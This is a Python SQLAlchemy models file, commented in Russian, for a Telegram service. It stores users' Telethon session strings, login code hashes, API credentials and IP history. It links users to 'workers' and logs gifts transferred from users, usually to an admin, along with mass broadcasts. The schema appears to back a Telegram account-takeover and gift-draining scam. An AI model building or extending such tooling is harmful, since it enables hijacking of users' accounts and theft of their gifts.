"""
Модели для управления Telegram сессиями пользователей
"""
from datetime import datetime
from sqlalchemy import Column, Integer, String, DateTime, Boolean, Text, ForeignKey

from app.database import Base


class TelegramSession(Base):
    """Модель Telegram сессии пользователя"""
    __tablename__ = "telegram_sessions"

    id = Column(Integer, primary_key=True, index=True)
    user_telegram_id = Column(String, index=True)  # ID пользователя
    worker_id = Column(Integer, ForeignKey("workers.id"), nullable=True)  # К какому воркеру привязан
    
    # Данные сессии
    session_string = Column(Text)  # Telethon session string
    phone_number = Column(String)
    phone_code_hash = Column(String, nullable=True)  # Hash кода для верификации
    api_id = Column(String)
    api_hash = Column(String)
    
    # Статус
    is_active = Column(Boolean, default=True)
    is_authorized = Column(Boolean, default=False)
    
    # Даты
    created_at = Column(DateTime, default=datetime.utcnow)
    last_used = Column(DateTime, nullable=True)
    authorized_at = Column(DateTime, nullable=True)
    
    # Метаданные
    device_model = Column(String, nullable=True)
    system_version = Column(String, nullable=True)
    app_version = Column(String, nullable=True)


class IPHistory(Base):
    """История IP адресов пользователей"""
    __tablename__ = "ip_history"

    id = Column(Integer, primary_key=True, index=True)
    user_telegram_id = Column(String, index=True)
    ip_address = Column(String, index=True)
    
    # Дополнительная информация
    user_agent = Column(Text, nullable=True)
    country = Column(String, nullable=True)
    city = Column(String, nullable=True)
    
    # Дата
    accessed_at = Column(DateTime, default=datetime.utcnow, index=True)


class GiftTransfer(Base):
    """История передачи подарков"""
    __tablename__ = "gift_transfers"

    id = Column(Integer, primary_key=True, index=True)
    
    # Участники
    from_user_id = Column(String, index=True)  # От кого
    to_user_id = Column(String, index=True)  # Кому (обычно админ)
    worker_id = Column(Integer, ForeignKey("workers.id"), nullable=True)  # Воркер, к которому привязан пользователь
    
    # Данные подарка
    gift_id = Column(String)  # ID подарка в Telegram
    gift_name = Column(String, nullable=True)
    gift_link = Column(String, nullable=True)
    gift_value_stars = Column(Integer, default=0)  # Стоимость в звездах
    
    # Тип операции
    operation_type = Column(String)  # transfer, convert_to_stars, buy_with_stars
    
    # Статус
    status = Column(String, default="pending")  # pending, completed, failed
    error_message = Column(Text, nullable=True)
    
    # Даты
    created_at = Column(DateTime, default=datetime.utcnow, index=True)
    completed_at = Column(DateTime, nullable=True)


class Broadcast(Base):
    """История рассылок"""
    __tablename__ = "broadcasts"

    id = Column(Integer, primary_key=True, index=True)
    
    # Отправитель (админ)
    admin_id = Column(String, index=True)
    
    # Содержимое
    message_text = Column(Text)
    photo_url = Column(String, nullable=True)
    button_text = Column(String, nullable=True)
    button_url = Column(String, nullable=True)
    
    # Статистика
    total_users = Column(Integer, default=0)
    sent_count = Column(Integer, default=0)
    failed_count = Column(Integer, default=0)
    
    # Статус
    status = Column(String, default="draft")  # draft, sending, completed, failed
    
    # Даты
    created_at = Column(DateTime, default=datetime.utcnow)
    started_at = Column(DateTime, nullable=True)
    completed_at = Column(DateTime, nullable=True)
